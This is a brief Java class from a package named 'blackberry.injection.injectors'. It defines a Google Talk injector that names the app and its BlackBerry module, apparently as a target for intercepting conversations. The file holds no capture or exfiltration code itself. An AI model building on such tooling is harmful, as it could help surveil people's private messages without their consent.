package blackberry.injection.injectors;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class GoogleTalkInjector extends AConversationInjector {

    //#ifdef DEBUG
    private static Debug debug = new Debug("GoogleTalkInjector",
            DebugLevel.VERBOSE);

    //#endif

    public String getAppName() {
        return "Google Talk";
    }

    public String getCodName() {
        return "net_rim_bb_qm_google";
    }

}
